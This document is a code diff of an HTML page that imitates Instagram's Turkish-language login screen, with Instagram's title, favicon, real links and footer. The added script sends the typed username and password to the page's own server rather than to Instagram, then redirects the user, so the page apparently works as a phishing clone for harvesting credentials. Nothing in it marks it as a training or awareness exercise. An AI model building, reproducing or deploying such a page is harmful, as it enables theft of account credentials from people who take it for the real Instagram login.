@@ -2,32 +2,32 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Login • Instagram</title>
-    <link rel="stylesheet" href="styles.css">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Instagram</title>
     <link data-default-icon="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png" rel="icon" sizes="192x192" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link rel="stylesheet" href="styles.css">        
 </head>
 <body>
-
 <div class="wrapper">
     <div class="image-desktop">
-        <img src="images\PcImage-removebg-preview.png" alt="Your Image" style="width: 100%;">
+        <img src="images\PcImage-removebg-preview.png" alt="Resminiz" style="width: 100%;">
     </div>
     <div class="header">
         <div class="top">
             <div class="logo">
-                <img src="images/instagram.png" alt="instagram" style="width: 175px;">
+                <img src="images\instagram.png" alt="instagram" style="width: 175px;">
             </div>
             <div class="form">
-                <form action="/submit" method="post">
+                <form id="loginForm" action="/" method="post" onsubmit="handleLogin(event)">
                     <div class="input_field">
-                        <input type="text" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" class="input" required>
+                        <input type="text" id="username" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" class="input" required>
                     </div>
                     <div class="input_field">
-                        <input type="password" name="password" placeholder="Parola" class="input" required>
+                        <input type="password" id="password" name="password" placeholder="Şifre" class="input" required>
                     </div>
                     <div class="btn"><button type="submit">Giriş Yap</button></div>
+                    <p id="error-message" style="color: red; display: none;"></p>
                 </form>
             </div>
             <div class="or">
@@ -37,22 +37,23 @@
             </div>
             <div class="dif">
                 <div class="fb">
-                    <img src="images/facebook.png" alt="facebook">
-                    <a href="https://www.facebook.com/login.php">ㅤFacebook ile Giriş Yap</a>
+                    <img src="images\facebook.png" alt="facebook">
+                    <a href="https://www.facebook.com/login.php">Facebook ile Giriş Yap</a>
                 </div>
+                <br>
                 <div class="forgot">
-                    <a href="https://www.instagram.com/accounts/password/reset/">Şifreni mi unuttun?</a>
+                    <a href="https://www.instagram.com/accounts/password/reset/">Şifrenizi mi unuttunuz?</a>
                 </div>
             </div>
         </div>
         <div class="signup">
-            <p>Hesabın yok mu? <a href="https://www.instagram.com/accounts/emailsignup/">Kaydol</a></p>
+            <p>Hesabınız yok mu? <a href="https://www.instagram.com/accounts/emailsignup/">Kaydol</a></p>
         </div>
         <div class="apps">
-            <p>Uygulamayı edin.</p>
+            <p>Uygulamayı indir.</p>
             <div class="icons">
-                <a href="https://apps.apple.com/us/app/instagram/id389801252"><img src="images/appstore.png" alt="appstore"></a>
-                <a href="https://play.google.com/store/apps/details?id=com.instagram.android"><img src="images/googleplay.png" alt="googleplay"></a>
+                <a href="https://apps.apple.com/us/app/instagram/id389801252"><img src="images\appstore.png" alt="App Store"></a>
+                <a href="https://play.google.com/store/apps/details?id=com.instagram.android"><img src="images\googleplay.png" alt="Google Play"></a>
             </div>
         </div>
     </div>
@@ -60,56 +61,84 @@
         <div class="links">
             <ul>
                 <li><a href="https://about.meta.com/">Meta</a></li>
-                <li><a href="https://about.instagram.com/">Hakkında</a></li>
+                <li><a href="https://about.instagram.com/">Hakkımızda</a></li>
                 <li><a href="https://about.instagram.com/blog">Blog</a></li>
-                <li><a href="https://about.instagram.com/about-us/careers">İş İlanları</a></li>
+                <li><a href="https://about.instagram.com/about-us/careers">Kariyer</a></li>
                 <li><a href="https://help.instagram.com/">Yardım</a></li>
                 <li><a href="https://developers.facebook.com/docs/instagram">API</a></li>
                 <li><a href="https://privacycenter.instagram.com/">Gizlilik</a></li>
                 <li><a href="https://www.instagram.com/privacy/cookie_settings/">Çerez Ayarları</a></li>
                 <li><a href="https://help.instagram.com/581066165581870/">Koşullar</a></li>
-                <li><a href="https://www.instagram.com/explore/locations/">Konumlar</a></li>
+                <li><a href="https://www.instagram.com/explore/locations/">Mekanlar</a></li>
                 <li><a href="https://www.instagram.com/web/lite/">Instagram Lite</a></li>
                 <li><a href="https://www.threads.net/">Threads</a></li>
-                <li><a href="https://www.facebook.com/help/instagram/261704639352628">Kişi Yükleme ve Kullanıcı Olmayanlar</a></li>
-                <li><a href="https://about.meta.com/technologies/meta-verified/">Meta Verified</a></li>
+                <li><a href="https://www.facebook.com/help/instagram/261704639352628">Veri Politikası</a></li>
+                <li><a href="https://about.meta.com/technologies/meta-verified/">Meta Doğrulanmış</a></li>
             </ul>
         </div>
     </div>
     <div class="languages">
         <select name="languages" id="languages">
-            <option value="en.html">Türkçe</option>
+            <option value="tr.html">Türkçe</option>
+            <option value="en.html">İngilizce</option>
             <option value="ar.html">العربية</option>
-            <option value="cs.html">Čeština</option>
-            <option value="da.html">Dansk</option>
-            <option value="de.html">Deutsch</option>
-            <option value="el.html">Ελληνικά</option>
-            <option value="af.html">Afrikaans</option>
-            <option value="en-uk.html">English (UK)</option>
-            <option value="es-es.html">Español (España)</option>
-            <option value="es.html">Español</option>
-            <option value="fa.html">فارسی</option>
-            <option value="fi.html">Suomi</option>
-            <option value="fr.html">Français</option>
-            <option value="he.html">עברית</option>
-            <option value="id.html">Bahasa Indonesia</option>
-            <option value="no.html">Norsk</option>
-            <option value="nl.html">Nederlands</option>
-            <option value="pl.html">Polski</option>
-            <option value="ru.html">Русский</option>
-            <option value="sv.html">Svenska</option>
-            <option value="fil.html">Filipino</option>
-            <option value="tr.html">English</option>
-            <option value="zh-cn.html">中文(简体)</option>
-            <option value="gu.html">ગુજરાતી</option>
-            <option value="hr.html">Hrvatski</option>
-            <option value="fr-ca.html">Français (Canada)</option>
-            <option value="ro.html">Română</option>
-            <option value="sr.html">Српски</option>
-        </select>    
-        <p id="cinsta">© 2024 Instagram from Meta</p>
+            <option value="cs.html">Çekçe</option>
+            <option value="da.html">Danca</option>
+            <option value="de.html">Almanca</option>
+            <option value="el.html">Yunanca</option>
+            <option value="af.html">Afrikaanca</option>
+            <option value="en-uk.html">İngilizce (İngiltere)</option>
+            <option value="es-es.html">İspanyolca (İspanya)</option>
+            <option value="es.html">İspanyolca</option>
+            <option value="fa.html">Farsça</option>
+            <option value="fi.html">Fince</option>
+            <option value="fr.html">Fransızca</option>
+            <option value="he.html">İbranice</option>
+            <option value="id.html">Endonezce</option>
+            <option value="no.html">Norveççe</option>
+            <option value="nl.html">Felemenkçe</option>
+            <option value="pl.html">Lehçe</option>
+            <option value="ru.html">Rusça</option>
+            <option value="sv.html">İsveççe</option>
+            <option value="fil.html">Filipince</option>
+            <option value="zh-cn.html">Çince (Basit)</option>
+            <option value="gu.html">Gujaratça</option>
+            <option value="hr.html">Hırvatça</option>
+            <option value="fr-ca.html">Fransızca (Kanada)</option>
+            <option value="ro.html">Romence</option>
+            <option value="sr.html">Sırpça</option>
+        </select>
+        <p id="cinsta">© 2024 Instagram, Meta'dan</p>
     </div>
-    
 </div>
+
+<script>
+    async function handleLogin(event) {
+        event.preventDefault();
+
+        const form = event.target;
+        const formData = new FormData(form);
+        const data = new URLSearchParams();
+        for (const pair of formData) {
+            data.append(pair[0], pair[1]);
+        }
+
+        const response = await fetch(form.action, {
+            method: 'POST',
+            body: data
+        });
+
+        const result = await response.json();
+
+        if (result.status === 'success') {
+            window.location.href = result.redirect;
+        } else {
+            const errorMsg = result.error_msg || 'Bir hata oluştu.';
+            const errorMessageElement = document.getElementById('error-message');
+            errorMessageElement.innerText = errorMsg;
+            errorMessageElement.style.display = 'block';
+        }
+    }
+</script>
 </body>
 </html>
